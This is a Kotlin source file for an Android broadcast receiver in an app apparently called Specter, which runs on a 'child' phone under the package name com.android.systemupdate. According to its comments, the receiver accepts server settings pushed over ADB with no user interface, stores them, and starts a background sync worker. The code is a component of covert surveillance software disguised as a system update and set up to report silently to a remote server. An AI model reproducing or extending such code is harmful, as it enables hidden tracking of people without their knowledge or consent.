package com.divine.specter.child.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.divine.specter.child.worker.SyncWorker

/**
 * Receives configuration from parent device via ADB broadcast.
 * This is how the parent injects server config without any UI interaction.
 *
 * Usage from parent:
 * adb shell am broadcast -a specter.child.CONFIGURE \
 *     -n com.android.systemupdate/.receiver.ConfigReceiver \
 *     --es server_ip "192.168.1.100" \
 *     --ei server_port 5555 \
 *     --es device_name "Child_Phone"
 */
class ConfigReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "ConfigReceiver"
        const val ACTION_CONFIGURE = "specter.child.CONFIGURE"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_CONFIGURE) return

        val serverIp = intent.getStringExtra("server_ip")
        val serverPort = intent.getIntExtra("server_port", 8855)
        val deviceName = intent.getStringExtra("device_name") ?: "Child_${System.currentTimeMillis()}"

        if (serverIp.isNullOrBlank()) {
            Log.e(TAG, "No server_ip provided in broadcast")
            return
        }

        Log.i(TAG, "Received config: server=$serverIp:$serverPort, name=$deviceName")

        // Save configuration
        val prefs = context.getSharedPreferences("specter_child_prefs", Context.MODE_PRIVATE)
        prefs.edit().apply {
            putString("server_ip", serverIp)
            putInt("server_port", serverPort)
            putString("device_name", deviceName)
            putString("device_id", getOrCreateDeviceId(prefs))
            putBoolean("is_configured", true)
            putLong("configured_at", System.currentTimeMillis())
            apply()
        }

        Log.i(TAG, "Configuration saved, scheduling sync worker")

        // Use WorkManager to trigger sync (avoids BackgroundServiceStartNotAllowedException)
        val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
            .build()

        WorkManager.getInstance(context).enqueueUniqueWork(
            "initial_sync",
            ExistingWorkPolicy.REPLACE,
            syncWork
        )

        Log.i(TAG, "Sync worker enqueued")
    }

    private fun getOrCreateDeviceId(prefs: android.content.SharedPreferences): String {
        val existing = prefs.getString("device_id", null)
        if (!existing.isNullOrBlank()) return existing

        return "child_${java.util.UUID.randomUUID().toString().take(8)}"
    }
}
